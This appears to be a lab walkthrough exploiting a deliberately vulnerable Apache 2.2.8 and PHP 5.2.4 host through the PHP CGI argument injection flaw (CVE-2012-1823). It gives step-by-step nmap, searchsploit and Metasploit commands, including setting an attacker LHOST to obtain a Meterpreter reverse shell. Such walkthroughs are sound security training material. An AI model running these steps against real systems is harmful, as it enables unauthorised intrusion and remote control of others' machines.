# <div align="center">HTTP (Apache 2.2.8 + PHP 5.2.4) Enumeration & Exploitation</div>
<div align="center">
This target hosts a vulnerable HTTP service running Apache 2.2.8 with PHP 5.2.4, identified during enumeration. The outdated PHP CGI component was exploited using a known argument injection vulnerability to achieve remote code execution.
</div>

<div align="center">
  <img width="550" height="350" alt="image" src="https://github.com/user-attachments/assets/d82bfb5a-1a6f-4c2e-9c55-6b8fd526fc2e" />
</div>

## 1. HTTP Reconnaissance using Nmap

### 🔍 Command Used

nmap -p- -sV -sC <target-ip>

### 📌 Explanation

- `-p-` → Scans all 65535 ports  
- `-sV` → Detects service versions  
- `-sC` → Runs default scripts  

### 🎯 Purpose

Identify web services and versions running on the target system.

### 📊 Key Findings

- Port 80/tcp → Open  
- Service → HTTP  
- Server → Apache httpd 2.2.8 (Ubuntu) DAV/2  
- PHP Version → 5.2.4  

👉 This outdated stack is vulnerable to PHP CGI argument injection.

<p align="center">
  <img width="917" height="111" alt="image" src="https://github.com/user-attachments/assets/c4d0a582-89c1-45b0-bd29-77e3479f8fd4" />
</p>

## 2. HTTP Version Detection using Metasploit

### 🔍 Command Used

msfconsole  
search http_version  
use auxiliary/scanner/http/http_version  
set RHOSTS <target-ip>  
run  

### 📌 Explanation

This module confirms the HTTP service and extracts detailed version information.

<p align="center">
  <img width="940" height="551" alt="image" src="https://github.com/user-attachments/assets/ddd057aa-3230-4089-8cc5-4eac162b0c45" />
</p>

## 3. Searching for Exploits

### 🔍 Command Used

searchsploit apache php 5.2.4  

### 📌 Explanation

Search for known vulnerabilities affecting Apache + PHP combination.

### 📊 Result

- PHP CGI Argument Injection (CVE-2012-1823)  
👉 Allows remote code execution via crafted HTTP requests.

<p align="center">
  <img width="940" height="158" alt="image" src="https://github.com/user-attachments/assets/d83de1fc-3784-42e4-8551-624e9f6532d0" />
</p>

## 4. Selecting the Exploit in Metasploit

### 🔍 Command Used

search php cgi  
use exploit/multi/http/php_cgi_arg_injection  

👉 This exploit targets PHP CGI argument injection vulnerability.

<p align="center">
  <img width="940" height="534" alt="image" src="https://github.com/user-attachments/assets/8cfb52b6-5b70-4d42-b05f-7780235e2d70" />
</p>

## 5. Configuring Exploit Options

### 🔍 Command Used

show options  
set RHOSTS <target-ip>  
set LHOST <your-ip>  

### 📌 Explanation

- `RHOSTS` → Target machine IP  
- `LHOST` → Attacker machine IP  

<p align="center">
  <img width="940" height="592" alt="image" src="https://github.com/user-attachments/assets/d3a23cb8-a225-40c0-b590-65e2a754c47e" />
</p>

## 6. Exploitation

### 🔍 Command Used

exploit  

👉 The exploit successfully executed, providing a Meterpreter reverse shell.

<p align="center">
  <img width="940" height="653" alt="image" src="https://github.com/user-attachments/assets/c63c1c63-46ee-474c-bc02-ba797d241a95" />
</p>

## 7. Proof of Exploitation

- Gained remote shell access  
- Executed system commands  

👉 Confirms full remote code execution on the target.









